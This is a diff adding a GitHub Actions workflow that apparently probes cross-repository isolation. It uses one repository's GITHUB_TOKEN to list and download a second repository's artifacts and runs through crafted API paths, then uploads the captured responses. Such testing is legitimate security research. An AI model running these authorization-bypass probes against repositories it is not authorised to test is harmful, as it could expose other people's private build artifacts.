@@ -1,0 +1,83 @@
+name: C10 Artifact Replay
+on:
+  push:
+    branches: [c10-artifact]
+permissions:
+  contents: read
+  actions: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Try to download repo B's artifact from repo A
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        shell: bash
+        run: |
+          set +e
+          mkdir -p /tmp/c10b
+
+          # Step 1: List repo B's artifacts via REPO A's GITHUB_TOKEN (should be 404 if cross-repo isolated)
+          echo "=== List B artifacts via A's GITHUB_TOKEN ==="
+          curl -sS -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/fox32932/pages-test-cycle9-b/actions/artifacts" \
+            -w "\nHTTP %{http_code}\n" > /tmp/c10b/list_b.txt 2>&1
+          cat /tmp/c10b/list_b.txt | head -50
+
+          # Step 2: Try the actions/download-artifact @v4 internal API path
+          # The signed URL flow: POST /_apis/pipelines/workflows/{runId}/artifacts/{containerId}/{name}/_apis/artifactstore/...
+          # Twirp endpoints that download-artifact uses
+          echo "=== Try Twirp GetSignedArtifactURL ==="
+          # Get repo A's run ID — won't have repo B artifacts but test if repo-id ambiguity exists
+          curl -sS -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/fox32932/pages-test-cycle9-b/actions/runs?per_page=3" \
+            -w "\nHTTP %{http_code}\n" > /tmp/c10b/runs_b.txt 2>&1
+          cat /tmp/c10b/runs_b.txt | head -30
+
+          # Step 3: List runs on repo B to find a known artifact id
+          # Then attempt direct download from repo A context
+          B_ART=$(curl -sS -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9-b/actions/artifacts" | jq -r '.artifacts[0].id // empty')
+          echo "Discovered B artifact id: $B_ART"
+
+          if [ -n "$B_ART" ]; then
+            # Try downloading via the api artifacts/{id}/zip endpoint with repo A path
+            for URL in \
+              "https://api.github.com/repos/fox32932/pages-test-cycle9/actions/artifacts/$B_ART/zip" \
+              "https://api.github.com/repos/fox32932/pages-test-cycle9-b/actions/artifacts/$B_ART/zip" \
+              "https://api.github.com/repos/fox32932/pages-test-cycle9/actions/artifacts/$B_ART" \
+              ; do
+              echo "=== GET $URL ==="
+              curl -sSL -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "$URL" -o /tmp/c10b/dl.bin -w "\nHTTP %{http_code} size=%{size_download}\n" -D /tmp/c10b/hdrs.txt
+              echo "headers:"; head -10 /tmp/c10b/hdrs.txt
+              echo "first bytes:"; head -c 200 /tmp/c10b/dl.bin | xxd | head -10
+              sleep 2
+            done
+          fi
+
+          # Step 4: actions/download-artifact@v4 requires runId; try crafted runId from repo B but path repo A
+          if [ -n "$B_ART" ]; then
+            B_RUN=$(curl -sS -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9-b/actions/runs?per_page=1" | jq -r '.workflow_runs[0].id')
+            echo "B run id: $B_RUN"
+            # via repo A path with B's run_id
+            for URL in \
+              "https://api.github.com/repos/fox32932/pages-test-cycle9/actions/runs/$B_RUN/artifacts" \
+              "https://api.github.com/repos/fox32932/pages-test-cycle9/actions/runs/$B_RUN/artifacts/github-pages" \
+              ; do
+              echo "=== GET $URL ==="
+              curl -sS -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "$URL" -w "\nHTTP %{http_code}\n" > /tmp/c10b/cross_run.txt 2>&1
+              cat /tmp/c10b/cross_run.txt
+              sleep 2
+            done
+          fi
+
+          tar czf /tmp/c10b.tar.gz -C /tmp c10b
+          ls -la /tmp/c10b.tar.gz
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: c10-artifact-probe
+          path: /tmp/c10b.tar.gz
+          retention-days: 1
+          if-no-files-found: warn
